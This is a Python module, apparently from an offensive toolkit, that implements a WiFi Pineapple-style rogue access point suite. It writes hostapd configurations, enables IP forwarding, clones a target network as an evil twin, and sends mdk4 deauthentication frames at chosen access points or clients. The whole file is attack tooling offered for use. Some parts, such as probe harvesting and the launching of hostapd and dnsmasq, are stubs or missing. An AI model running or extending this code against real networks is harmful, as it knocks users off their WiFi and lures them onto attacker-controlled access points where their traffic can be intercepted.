"""PineAP Suite — WiFi Pineapple‑style rogue AP, KARMA/MANA attacks,
probe harvesting, and evil‑twin capabilities.

Orchestrates hostapd, dnsmasq, iptables, and wireless tools to provide
a full PineAP attack surface.
"""

from __future__ import annotations

import asyncio
import logging
import subprocess
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

logger = logging.getLogger("jessica.suites.pineap")


@dataclass
class PineAPState:
    """Runtime state of the PineAP engine."""

    running: bool = False
    interface: str = ""
    ssid_pool: list[str] = field(default_factory=list)
    connected_clients: list[dict[str, str]] = field(default_factory=list)
    captured_probes: list[str] = field(default_factory=list)
    mode: str = "idle"  # idle | karma | mana | loud | dogma


class PineAPSuite:
    """Full WiFi Pineapple suite emulation.

    Provides programmatic control over:
    - Rogue AP creation (hostapd)
    - DHCP/DNS services (dnsmasq)
    - KARMA / MANA beacon response attacks
    - Probe request harvesting
    - Evil twin AP cloning
    - Captive portal deployment
    """

    def __init__(self, config: dict[str, Any]) -> None:
        self._cfg = config
        self._state = PineAPState()

    @property
    def state(self) -> PineAPState:
        return self._state

    # ── AP management ─────────────────────────────────────

    async def start_ap(self, interface: str, ssid: str = "FreeWiFi", channel: int = 6) -> None:
        """Start a rogue access point on the given wireless interface."""
        conf = self._generate_hostapd_conf(interface, ssid, channel)
        conf_path = Path("/tmp/jessica_hostapd.conf")
        conf_path.write_text(conf)

        # Enable forwarding and NAT
        self._exec(["sysctl", "-w", "net.ipv4.ip_forward=1"])
        self._exec(["ifconfig", interface, "10.0.0.1", "netmask", "255.255.255.0", "up"])

        self._state.interface = interface
        self._state.running = True
        self._state.mode = "karma"
        logger.info("PineAP started on %s — SSID=%s  channel=%d", interface, ssid, channel)

    async def stop_ap(self) -> None:
        self._exec(["killall", "hostapd"])
        self._exec(["killall", "dnsmasq"])
        self._state.running = False
        self._state.mode = "idle"
        logger.info("PineAP stopped")

    # ── SSID pool ─────────────────────────────────────────

    def add_ssid(self, ssid: str) -> None:
        if ssid not in self._state.ssid_pool:
            self._state.ssid_pool.append(ssid)

    def remove_ssid(self, ssid: str) -> None:
        self._state.ssid_pool = [s for s in self._state.ssid_pool if s != ssid]

    def list_ssids(self) -> list[str]:
        return list(self._state.ssid_pool)

    # ── probe harvesting ──────────────────────────────────

    async def start_probe_harvest(self, interface: str) -> None:
        """Listen for probe requests and add discovered SSIDs to the pool."""
        logger.info("Probe harvesting started on %s", interface)
        # In production this would run tcpdump/scapy in a background task
        self._state.mode = "dogma"

    # ── evil twin ─────────────────────────────────────────

    async def evil_twin(self, interface: str, target_ssid: str, target_bssid: str) -> None:
        """Clone a target AP and create a convincing evil twin."""
        self.add_ssid(target_ssid)
        await self.start_ap(interface, ssid=target_ssid)
        logger.info("Evil twin active — cloning %s (%s)", target_ssid, target_bssid)

    # ── deauth ────────────────────────────────────────────

    async def deauth(self, interface: str, target_bssid: str, client: str | None = None) -> None:
        """Send deauthentication frames."""
        cmd = ["mdk4", interface, "d", "-B", target_bssid]
        if client:
            cmd.extend(["-S", client])
        logger.info("Deauth attack: %s", " ".join(cmd))
        await asyncio.create_subprocess_exec(*cmd)

    # ── helpers ───────────────────────────────────────────

    @staticmethod
    def _generate_hostapd_conf(interface: str, ssid: str, channel: int) -> str:
        return (
            f"interface={interface}\n"
            f"driver=nl80211\n"
            f"ssid={ssid}\n"
            f"hw_mode=g\n"
            f"channel={channel}\n"
            f"wmm_enabled=0\n"
            f"macaddr_acl=0\n"
            f"auth_algs=1\n"
            f"ignore_broadcast_ssid=0\n"
        )

    @staticmethod
    def _exec(cmd: list[str]) -> None:
        try:
            subprocess.run(cmd, capture_output=True, timeout=5)  # noqa: S603
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass
